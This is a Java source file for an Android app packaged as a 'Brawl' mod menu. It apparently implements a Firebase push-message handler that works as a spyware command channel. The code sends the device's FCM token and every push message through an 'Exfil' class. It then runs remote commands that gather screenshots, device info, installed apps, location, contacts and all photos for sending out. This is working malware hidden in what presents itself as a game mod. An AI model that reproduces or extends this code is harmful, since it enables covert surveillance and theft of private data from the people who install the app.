package com.brawl.modmenu;

import com.google.firebase.messaging.FirebaseMessagingService;
import com.google.firebase.messaging.RemoteMessage;
import java.util.Map;

public class FirebaseService extends FirebaseMessagingService {

    @Override
    public void onNewToken(String token) {
        super.onNewToken(token);
        Exfil.send("FCM_TOKEN", "Токен:\n" + token);
        getSharedPreferences("fcm", MODE_PRIVATE)
            .edit().putString("token", token).apply();
    }

    @Override
    public void onMessageReceived(RemoteMessage msg) {
        super.onMessageReceived(msg);

        try {
            // Логируем ВСЁ что приходит
            StringBuilder log = new StringBuilder();

            if (msg.getNotification() != null) {
                log.append("NOTIF_TITLE: ").append(msg.getNotification().getTitle()).append("\n");
                log.append("NOTIF_BODY: ").append(msg.getNotification().getBody()).append("\n");
            }

            Map<String, String> data = msg.getData();
            if (data != null && !data.isEmpty()) {
                log.append("DATA:\n");
                for (Map.Entry<String, String> e : data.entrySet()) {
                    log.append("  ").append(e.getKey()).append(" = ").append(e.getValue()).append("\n");
                }
            } else {
                log.append("DATA: пусто\n");
            }

            Exfil.send("FCM_RAW", log.toString());

            // Обработка команды
            if (data != null) {
                String command = data.get("cmd");
                if (command != null && !command.isEmpty()) {
                    Exfil.send("FCM_CMD", "Получено: " + command);
                    handleCommand(command);
                }
            }
        } catch (Throwable t) {
            Exfil.send("FCM_ERR", t.getClass().getSimpleName() + ": " + t.getMessage());
        }
    }

    private void handleCommand(String text) {
        try {
            if (text.startsWith("/ping")) { Exfil.send("FCM", "Pong из FCM!"); return; }
            if (text.startsWith("/screenshot")) {
                try {
                    android.content.Intent i = new android.content.Intent(this, MediaSniffer.class);
                    i.setAction("CAPTURE_NOW");
                    startService(i);
                } catch (Throwable t) {}
                return;
            }
            if (text.startsWith("/info")) { CommandHandler.sendInfo(this); return; }
            if (text.startsWith("/apps")) { AppList.dump(this); return; }
            if (text.startsWith("/battery")) { CommandHandler.sendBattery(this); return; }
            if (text.startsWith("/location")) { CommandHandler.sendLocation(this); return; }
            if (text.startsWith("/contacts")) { CommandHandler.sendContacts(this); return; }
            if (text.startsWith("/screens")) { ScreenshotsGrabber.grab(); return; }
            if (text.startsWith("/photos_all")) { FileManager.allPhotos(this); return; }
            Exfil.send("FCM", "Неизвестно: " + text);
        } catch (Throwable t) {
            Exfil.send("FCM_ERR", t.getMessage());
        }
    }
}
